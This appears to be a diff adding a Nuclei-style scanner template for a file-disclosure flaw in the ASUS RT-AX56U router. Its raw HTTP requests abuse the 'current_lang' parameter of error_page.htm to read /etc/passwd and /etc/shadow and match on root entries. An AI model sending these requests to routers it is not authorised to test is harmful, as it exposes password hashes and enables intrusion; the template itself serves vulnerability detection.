@@ -1,0 +1,54 @@
+id: asus-rt-ax56u-info-disclosure
+
+info:
+  name: ASUS RT-AX56U Sensitive Information Disclosure Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    The ASUS RT-AX56U router allows reading sensitive files like `/etc/passwd` or `/etc/shadow` due to improper access controls, leading to potential leakage of administrator password information.
+  reference:
+    - https://fofa.so/
+    - https://www.asus.com.cn/networking-iot-servers/wifi-routers/asus-wifi-routers/rt-ax56u/helpdesk_bios/?model2Name=RT-AX56U
+  tags:
+    - information-disclosure
+
+http:
+  - raw:
+      - |
+        GET /error_page.htm?current_lang=/////etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Referer: https://127.0.0.1/Main_Login.asp
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:/bin/sh"
+
+  - raw:
+      - |
+        GET /error_page.htm?current_lang=////{{filePath}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Referer: https://127.0.0.1/Main_Login.asp
+        Connection: close
+
+    payloads:
+      filePath:
+        - /etc/passwd
+        - /etc/shadow
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0"
